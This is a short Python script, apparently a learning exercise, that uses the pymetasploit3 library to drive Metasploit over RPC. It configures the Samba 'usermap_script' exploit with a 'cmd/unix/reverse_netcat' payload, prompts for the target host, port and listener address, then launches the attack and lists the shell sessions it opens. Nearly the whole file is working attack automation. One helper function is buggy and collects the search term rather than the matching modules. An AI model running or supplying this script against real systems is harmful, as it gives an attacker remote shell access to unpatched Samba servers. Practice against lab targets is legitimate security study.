#! /usr/bin/python3

from pymetasploit3.msfrpc import *

print('''

Make sure MSF is running on another tab.
In the terminal, type: 

> msfconsole
> load msgrpc [Pass=yourpasswd]

Take note of the MSGRPC password.

''')

PASSWORD = input('Enter your password: ')
client = MsfRpcClient(PASSWORD, port=55552, ssl=False)

'''
INSTRUCTIONS:
    1. Set the exploit .modules.use('exploit', EXPLOIT_PATH)
    2. Check required options with .missing_required
        a. For all options use .options
        b. Check option values use .runoptions
    3. Set RHOSTS with [RHOSTS]
    4. Check exploit payloads with .targetpayloads()
    5. Set a payload with .modules.use('payload', PAYLOAD_PATH)
        a. Step 2 sub steps apply here
    6. Set LHOST with [LHOST]
    7. Excute the exploit with .execute(payload)
    8. Exploit successful if job_id == 1 and failed if we got None

THOUGHTS:
    Not all payloads and exploits will have easy to configure options so 
    perhaps it's best to sort through the ones that just need a host or port 
    confirgured and look at the more complicated ones later.

'''

exploits = client.modules.exploits

def searchForExploits(query):
    exploitsList = []
    for exploit in exploits:
        if query in exploit:
            exploitsList.append(query)



# Setting module i.e. exploit + exploit path
# Will add user input for this
MODULE = 'exploit'
MODULE_PATH = 'multi/samba/usermap_script'

exploit = client.modules.use(MODULE, MODULE_PATH)

# Check required options
print('Missing required options')
print(exploit.missing_required, '\n')

# Setting exploit options
rhosts = input('Set RHOSTS: ')
exploit['RHOSTS'] = rhosts
rport = input('Set RPORT: ')
exploit['RPORT'] = rport

# Setting module i.e. payload + payload path
# Will add user input for this
MODULE = 'payload'
MODULE_PATH = 'cmd/unix/reverse_netcat'

payload = client.modules.use(MODULE, MODULE_PATH)

# Check required options
lhost = input('Set LHOST: ')
payload['LHOST'] = lhost


print(exploit.execute(payload=payload))

print(client.sessions.list)
consoleID = client.consoles.console().cid
console = client.consoles.console(consoleID)
print(console.run_module_with_output(exploit, payload=payload))


